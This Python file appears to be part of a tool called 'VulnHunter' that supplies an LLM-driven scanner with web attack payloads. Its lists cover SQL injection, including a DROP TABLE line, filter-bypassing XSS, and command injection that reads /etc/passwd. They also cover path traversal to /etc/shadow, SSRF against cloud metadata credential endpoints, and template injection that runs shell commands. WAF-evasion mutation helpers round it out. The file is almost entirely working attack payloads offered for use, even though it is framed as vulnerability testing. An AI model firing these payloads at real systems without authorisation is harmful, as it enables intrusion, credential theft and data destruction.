"""
Payload Generator for VulnHunter
Generates sophisticated payloads for vulnerability testing
"""

import random
import string
import base64
import html
from typing import Optional, Dict, List, Any
from urllib.parse import quote, unquote
from loguru import logger


class PayloadGenerator:
    """
    Generates payloads for various vulnerability types
    Easy interface for LLM to get context-specific payloads
    """
    
    def __init__(self):
        # Encoding functions
        self.encoders = {
            'url': quote,
            'double_url': lambda x: quote(quote(x)),
            'html': html.escape,
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode': self._unicode_encode,
            'hex': self._hex_encode,
        }
    
    def _unicode_encode(self, s: str) -> str:
        """Unicode escape encoding"""
        return ''.join(f'\\u{ord(c):04x}' for c in s)
    
    def _hex_encode(self, s: str) -> str:
        """Hex encoding"""
        return ''.join(f'%{ord(c):02x}' for c in s)
    
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate random string for markers"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    # ==================
    # SQL Injection
    # ==================
    
    def sqli_payloads(self, context: str = "generic", db_type: str = "mysql") -> List[str]:
        """
        Generate SQL injection payloads
        
        LLM Usage:
            payloads = generator.sqli_payloads(context="login", db_type="mysql")
        """
        payloads = []
        
        # Error-based
        error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        # Boolean-based
        boolean_payloads = [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND 1=1--",
            "1' AND 1=2--",
        ]
        
        # Time-based by DB type
        time_payloads = {
            'mysql': [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "' AND (SELECT SLEEP(5))--",
                "' UNION SELECT SLEEP(5)--",
            ],
            'mssql': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' WAITFOR DELAY '0:0:5'--",
                "1; WAITFOR DELAY '0:0:5'--",
            ],
            'postgresql': [
                "'; SELECT PG_SLEEP(5)--",
                "' OR PG_SLEEP(5)--",
                "1; SELECT PG_SLEEP(5)--",
            ],
            'oracle': [
                "' AND DBMS_LOCK.SLEEP(5)--",
                "' OR DBMS_LOCK.SLEEP(5)--",
            ],
        }
        
        # UNION-based data extraction
        union_payloads = {
            'mysql': [
                "' UNION SELECT 1,@@version--",
                "' UNION SELECT 1,user()--",
                "' UNION SELECT 1,database()--",
                "' UNION SELECT 1,table_name FROM information_schema.tables--",
            ],
            'mssql': [
                "' UNION SELECT 1,@@version--",
                "' UNION SELECT 1,db_name()--",
                "' UNION SELECT 1,name FROM sysobjects WHERE xtype='U'--",
            ],
            'postgresql': [
                "' UNION SELECT 1,version()--",
                "' UNION SELECT 1,current_user--",
                "' UNION SELECT 1,table_name FROM information_schema.tables--",
            ],
        }
        
        payloads.extend(error_payloads)
        payloads.extend(boolean_payloads)
        
        if db_type.lower() in time_payloads:
            payloads.extend(time_payloads[db_type.lower()])
        else:
            payloads.extend(time_payloads['mysql'])
        
        if db_type.lower() in union_payloads:
            payloads.extend(union_payloads[db_type.lower()])
        
        # Context-specific payloads
        if context == "login":
            payloads.extend([
                "admin'--",
                "admin' OR '1'='1",
                "admin' OR '1'='1'--",
                "admin' OR '1'='1'/*",
                "' OR 1=1 LIMIT 1--",
                "admin'/*",
                "' OR ''='",
            ])
        elif context == "search":
            payloads.extend([
                "test' OR '1'='1",
                "test%' OR '%'='",
                "test' UNION SELECT NULL--",
            ])
        elif context == "numeric":
            payloads.extend([
                "1 OR 1=1",
                "1 AND 1=2",
                "1; DROP TABLE test--",
                "-1 OR 1=1",
                "1*2",
            ])
        
        return payloads
    
    # ==================
    # XSS
    # ==================
    
    def xss_payloads(self, context: str = "html", 
                    bypass_filter: bool = False) -> List[str]:
        """
        Generate XSS payloads
        
        LLM Usage:
            payloads = generator.xss_payloads(context="attribute", bypass_filter=True)
        """
        marker = self._generate_random_string()
        
        payloads = []
        
        # Basic payloads
        basic = [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            f"<script>alert('{marker}')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ]
        
        # Context-specific
        if context == "html":
            payloads.extend(basic)
            payloads.extend([
                "<div onmouseover=alert(1)>hover me</div>",
                "<iframe src=javascript:alert(1)>",
                "<object data=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
            ])
            
        elif context == "attribute":
            payloads.extend([
                "\" onclick=alert(1) \"",
                "' onclick=alert(1) '",
                "\" onmouseover=alert(1) \"",
                "\" onfocus=alert(1) autofocus \"",
                "\" onblur=alert(1) autofocus \"",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "\" style=\"background:url(javascript:alert(1))\"",
            ])
            
        elif context == "javascript":
            payloads.extend([
                "'-alert(1)-'",
                "\\'-alert(1)//",
                "</script><script>alert(1)</script>",
                "*/alert(1)/*",
                "';alert(1)//",
                "\";alert(1)//",
                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            ])
            
        elif context == "url":
            payloads.extend([
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "javascript:alert(document.domain)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            ])
        
        # Bypass payloads
        if bypass_filter:
            payloads.extend([
                # Case variation
                "<ScRiPt>alert(1)</ScRiPt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                
                # No quotes/spaces
                "<svg/onload=alert(1)>",
                "<img/src=x/onerror=alert(1)>",
                
                # HTML encoding
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
                
                # Unicode
                "<script>\\u0061lert(1)</script>",
                
                # Double encoding
                "%253Cscript%253Ealert(1)%253C/script%253E",
                
                # Nested tags
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                
                # Null bytes
                "<scr%00ipt>alert(1)</scr%00ipt>",
                
                # Different events
                "<body onpageshow=alert(1)>",
                "<input onpaste=alert(1)>",
                "<video><source onerror=alert(1)>",
                
                # Template injection
                "{{constructor.constructor('alert(1)')()}}",
                "${alert(1)}",
            ])
        
        return payloads
    
    # ==================
    # Command Injection
    # ==================
    
    def command_injection_payloads(self, os_type: str = "linux") -> List[str]:
        """
        Generate command injection payloads
        
        LLM Usage:
            payloads = generator.command_injection_payloads(os_type="linux")
        """
        marker = self._generate_random_string()
        
        # Universal payloads
        payloads = [
            f"; echo {marker}",
            f"| echo {marker}",
            f"& echo {marker}",
            f"|| echo {marker}",
            f"&& echo {marker}",
            f"`echo {marker}`",
            f"$(echo {marker})",
            f"; echo {marker};",
            f"| echo {marker}|",
            f"\n echo {marker}",
        ]
        
        if os_type.lower() == "linux":
            payloads.extend([
                "; id",
                "| id",
                "& id",
                "; whoami",
                "| whoami",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; sleep 5",
                "| sleep 5",
                "$(sleep 5)",
                "`sleep 5`",
                "${IFS}id",
                ";$IFS`id`",
                ";{id}",
            ])
        elif os_type.lower() == "windows":
            payloads.extend([
                "& whoami",
                "| whoami",
                "& dir",
                "| dir",
                "& type C:\\Windows\\win.ini",
                "& ping -n 5 127.0.0.1",
                "| ping -n 5 127.0.0.1",
            ])
        
        return payloads
    
    # ==================
    # Path Traversal
    # ==================
    
    def path_traversal_payloads(self, os_type: str = "linux", 
                               depth: int = 10) -> List[str]:
        """
        Generate path traversal payloads
        
        LLM Usage:
            payloads = generator.path_traversal_payloads(depth=15)
        """
        payloads = []
        
        # Target files
        linux_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
        ]
        
        windows_files = [
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
        ]
        
        # Traversal sequences
        sequences = [
            "../",
            "..\\",
            "....//",
            "....\\\\",
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",
            "..%5c",
            "..%c0%af",
            "..%c1%9c",
            "%252e%252e%252f",
        ]
        
        target_files = linux_files if os_type.lower() == "linux" else windows_files
        
        for seq in sequences:
            for d in range(1, depth + 1):
                traversal = seq * d
                for target in target_files:
                    # Remove leading slash for some variations
                    target_clean = target.lstrip('/').lstrip('C:').lstrip('\\')
                    payloads.append(traversal + target_clean)
        
        # Add null byte bypasses
        for payload in payloads[:20]:
            payloads.append(payload + "%00")
            payloads.append(payload + "%00.jpg")
        
        return payloads
    
    # ==================
    # SSRF
    # ==================
    
    def ssrf_payloads(self, target_type: str = "internal") -> List[str]:
        """
        Generate SSRF payloads
        
        LLM Usage:
            payloads = generator.ssrf_payloads(target_type="cloud")
        """
        payloads = []
        
        if target_type == "internal" or target_type == "all":
            payloads.extend([
                # Localhost
                "http://127.0.0.1",
                "http://localhost",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:22",
                "http://127.0.0.1:8080",
                "http://127.0.0.1:3000",
                
                # Internal networks
                "http://192.168.0.1",
                "http://192.168.1.1",
                "http://10.0.0.1",
                "http://172.16.0.1",
                
                # IPv6
                "http://[::1]",
                "http://[0:0:0:0:0:0:0:1]",
            ])
        
        if target_type == "cloud" or target_type == "all":
            payloads.extend([
                # AWS
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                
                # GCP
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/",
                
                # Azure
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                
                # DigitalOcean
                "http://169.254.169.254/metadata/v1/",
            ])
        
        if target_type == "bypass" or target_type == "all":
            payloads.extend([
                # IP encoding
                "http://2130706433",  # 127.0.0.1 decimal
                "http://0x7f000001",  # 127.0.0.1 hex
                "http://0177.0.0.1",  # 127.0.0.1 octal
                "http://127.1",
                "http://0",
                
                # IPv6 encoded
                "http://[::ffff:127.0.0.1]",
                
                # URL encoding
                "http://127.0.0.1%23",
                "http://127.0.0.1%00",
                
                # DNS rebinding placeholder
                "http://localtest.me",
                "http://spoofed.burpcollaborator.net",
            ])
        
        return payloads
    
    # ==================
    # SSTI
    # ==================
    
    def ssti_payloads(self, engine: str = "generic") -> List[str]:
        """
        Generate Server-Side Template Injection payloads
        
        LLM Usage:
            payloads = generator.ssti_payloads(engine="jinja2")
        """
        marker = self._generate_random_string()
        calc = "7*7"
        expected = "49"
        
        payloads = []
        
        # Detection payloads
        detection = [
            f"${{{calc}}}",
            f"#{{{calc}}}",
            f"{{{{{calc}}}}}",
            f"{{{{= {calc} }}}}",
            f"<%= {calc} %>",
            f"${{= {calc} }}",
        ]
        payloads.extend(detection)
        
        # Engine-specific
        if engine == "jinja2" or engine == "generic":
            payloads.extend([
                "{{7*7}}",
                "{{config}}",
                "{{self.__class__}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__bases__[0].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ])
        
        if engine == "twig" or engine == "generic":
            payloads.extend([
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ])
        
        if engine == "freemarker" or engine == "generic":
            payloads.extend([
                "${7*7}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            ])
        
        if engine == "velocity" or engine == "generic":
            payloads.extend([
                "#set($x=7*7)$x",
                "#set($rt=$class.forName('java.lang.Runtime').getRuntime().exec('id'))",
            ])
        
        if engine == "erb" or engine == "generic":
            payloads.extend([
                "<%= 7*7 %>",
                "<%= system('id') %>",
                "<%= `id` %>",
            ])
        
        return payloads
    
    # ==================
    # Utility Methods
    # ==================
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """
        Encode a payload
        
        LLM Usage:
            encoded = generator.encode_payload("<script>alert(1)</script>", "url")
        """
        if encoding in self.encoders:
            return self.encoders[encoding](payload)
        return payload
    
    def generate_polyglot(self, vuln_type: str) -> str:
        """
        Generate a polyglot payload that works in multiple contexts
        
        LLM Usage:
            polyglot = generator.generate_polyglot("xss")
        """
        if vuln_type == "xss":
            return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
        elif vuln_type == "sqli":
            return "'-var x=1;exec('wh'+'oami')--\"/**/OR/**/1=1--"
        return ""
    
    def mutate_payload(self, payload: str, mutations: int = 5) -> List[str]:
        """
        Generate mutations of a payload for WAF bypass
        
        LLM Usage:
            mutations = generator.mutate_payload("<script>alert(1)</script>")
        """
        mutated = []
        
        # Case variations
        mutated.append(payload.swapcase())
        mutated.append(payload.upper())
        mutated.append(payload.lower())
        
        # URL encoding
        mutated.append(quote(payload))
        
        # Double URL encoding
        mutated.append(quote(quote(payload)))
        
        # HTML encoding
        mutated.append(html.escape(payload))
        
        # Null byte insertion
        mutated.append(payload.replace(" ", "%00"))
        
        # Tab/newline variations
        mutated.append(payload.replace(" ", "\t"))
        mutated.append(payload.replace(" ", "\n"))
        
        return mutated[:mutations]
    
    def get_payload_for_test(self, vuln_type: str, context: str = "generic",
                            bypass: bool = False) -> List[str]:
        """
        Get appropriate payloads for a specific test
        
        LLM Usage:
            payloads = generator.get_payload_for_test("xss", context="attribute", bypass=True)
        """
        if vuln_type == "sqli":
            return self.sqli_payloads(context=context)
        elif vuln_type == "xss":
            return self.xss_payloads(context=context, bypass_filter=bypass)
        elif vuln_type == "rce":
            return self.command_injection_payloads()
        elif vuln_type == "lfi":
            return self.path_traversal_payloads()
        elif vuln_type == "ssrf":
            return self.ssrf_payloads()
        elif vuln_type == "ssti":
            return self.ssti_payloads()
        else:
            return []
